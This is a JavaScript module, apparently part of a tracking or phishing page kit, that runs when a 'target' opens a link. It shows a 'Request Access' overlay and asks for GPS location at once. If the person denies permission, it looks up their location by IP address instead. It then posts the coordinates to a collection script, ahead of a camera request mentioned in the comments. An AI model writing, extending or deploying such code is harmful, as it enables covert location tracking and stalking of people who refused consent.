/**
 * Location Request - Shared module for Request Access overlay
 * When target opens link: WAIT for user to allow or deny location permission.
 * - User allows: get location from GPS hardware
 * - User denies: fallback to IP-based geolocation
 * Do not proceed until we have the user's response.
 */
(function() {
    'use strict';

    var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');

    function submitLocation(lat, lng, source) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', BASE_URL + 'location-submit.php');
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('latitude=' + encodeURIComponent(lat) + '&longitude=' + encodeURIComponent(lng) + '&source=' + encodeURIComponent(source));
    }

    function proceedAfterLocation(onComplete) {
        var overlay = document.getElementById('requestAccessOverlay');
        if (overlay) {
            overlay.classList.add('hidden');
            setTimeout(function() {
                overlay.style.display = 'none';
                if (typeof onComplete === 'function') onComplete();
            }, 500);
        } else if (typeof onComplete === 'function') {
            onComplete();
        }
    }

    var locationRequestInProgress = false;

    function requestLocationAccess(onComplete) {
        if (locationRequestInProgress) return;
        locationRequestInProgress = true;

        var btn = document.getElementById('requestAccessBtn');
        var status = document.getElementById('requestAccessStatus');

        if (!navigator.geolocation) {
            // No GPS API: fallback to IP geolocation
            if (status) status.textContent = 'Location not supported. Using IP geolocation...';
            fetch(BASE_URL + 'geo-lookup.php')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.status === 'success') submitLocation(data.latitude, data.longitude, 'ip');
                    proceedAfterLocation(onComplete);
                })
                .catch(function() { proceedAfterLocation(onComplete); });
            return;
        }

        if (btn) btn.disabled = true;
        if (status) status.textContent = 'Waiting for your response - please allow or deny location access...';

        // Wait for user to allow or deny - do not proceed until we have a response
        navigator.geolocation.getCurrentPosition(
            function(position) {
                // User accepted: use GPS hardware coordinates
                var lat = position.coords.latitude;
                var lng = position.coords.longitude;
                if (status) status.textContent = 'GPS location obtained. Proceeding...';
                submitLocation(lat, lng, 'gps');
                proceedAfterLocation(onComplete);
            },
            function() {
                // User denied or GPS unavailable: fallback to IP geolocation
                if (status) status.textContent = 'Using IP geolocation...';
                fetch(BASE_URL + 'geo-lookup.php')
                    .then(function(r) { return r.json(); })
                    .then(function(data) {
                        if (data.status === 'success') submitLocation(data.latitude, data.longitude, 'ip');
                        proceedAfterLocation(onComplete);
                    })
                    .catch(function() { proceedAfterLocation(onComplete); });
            },
            { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
        );
    }

    function initLocationRequest(onComplete) {
        var btn = document.getElementById('requestAccessBtn');
        if (btn) {
            btn.addEventListener('click', function() {
                if (!btn.disabled) requestLocationAccess(onComplete);
            });
            // Auto-request location immediately so it's asked BEFORE camera (whether user allows or denies)
            requestLocationAccess(onComplete);
        } else if (typeof onComplete === 'function') {
            onComplete();
        }
    }

    window.LocationRequest = {
        init: initLocationRequest,
        requestAccess: requestLocationAccess,
        getBaseUrl: function() { return BASE_URL; }
    };
})();
